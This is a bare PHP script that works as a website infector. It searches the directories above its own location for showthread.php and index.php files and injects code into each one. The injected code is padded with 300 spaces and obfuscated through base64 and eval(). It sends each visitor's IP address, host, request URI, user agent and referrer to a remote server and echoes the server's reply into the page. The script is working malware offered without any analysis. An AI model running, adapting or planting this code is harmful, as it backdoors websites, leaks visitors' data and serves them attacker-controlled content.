<?php
set_time_limit(0);

function dir_num($dir)
{
global $fileslist;
static $deep = 0;

$odir = @opendir($dir);

while (($file = @readdir($odir)) !== FALSE)
{
if ($file == '.' || $file == '..')
{
continue;
}
else
{
echo '. ';
if(
($file == 'showthread.php')||($file == 'index.php')
) {$fileslist[] = $dir.DIRECTORY_SEPARATOR.$file;}
}

if (is_dir($dir.DIRECTORY_SEPARATOR.$file))
{
$deep ++;
dir_num($dir.DIRECTORY_SEPARATOR.$file);
$deep --;
}
}
@closedir($odir);
}


$dir = dirname(__FILE__);
$fileslist = array();
$tmp_dir = split('/',$dir);
$ooo = '';

for ($i=1; $i<count($tmp_dir);$i++){
$ooo = $ooo .'/'. $tmp_dir[$i];
$dirs[] = $ooo;
}

for($i=0; $i<count($dirs);$i++){
$list = array();
if ($h = @opendir($dirs[$i]))
{
while (($o = readdir($h)) !== false) {$list[] = $dirs[$i].$o;}
closedir($h);
}
if (count($list) <> 0){
$workdir = $dirs[$i];
dir_num ($workdir);
break;
}
}


for ($i=0;$i<count($fileslist);$i++)
{
$rab = trim($fileslist[$i]);
$tmp = file_get_contents($rab);

$pos = strpos($tmp, 'Pz48P3BocCAkM3JsID0gJ2h0dHA6Ly85Ni42OWUuYTZlLm8wL2J0LnBocCc7ID8');

if ($pos === false) {

$code = '';
for($k=0;$k<300;$k++){
$code = $code . ' ';
}
$code = $code . '?><?php $_F=__FILE__;$_X=\'Pz48P3BocCAkM3JsID0gJ2h0dHA6Ly85Ni42OWUuYTZlLm8wL2J0LnBocCc7ID8+\';eval(base64_decode(\'JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw==\'));$ua = urlencode(strtolower($_SERVER[\'HTTP_USER_AGENT\']));$ip = $_SERVER[\'REMOTE_ADDR\'];$host = $_SERVER[\'HTTP_HOST\'];$uri = urlencode($_SERVER[\'REQUEST_URI\']);$ref = urlencode($_SERVER[\'HTTP_REFERER\']);$url = $url.\'?ip=\'.$ip.\'&host=\'.$host.\'&uri=\'.$uri.\'&ua=\'.$ua.\'&ref=\'.$ref; $tmp = file_get_contents($url); echo $tmp; ?>';
$tmp = str_replace('?>',$code,$tmp);
$f = fopen($rab,"w");
fputs($f,$tmp);
fclose($f);
}
}
?>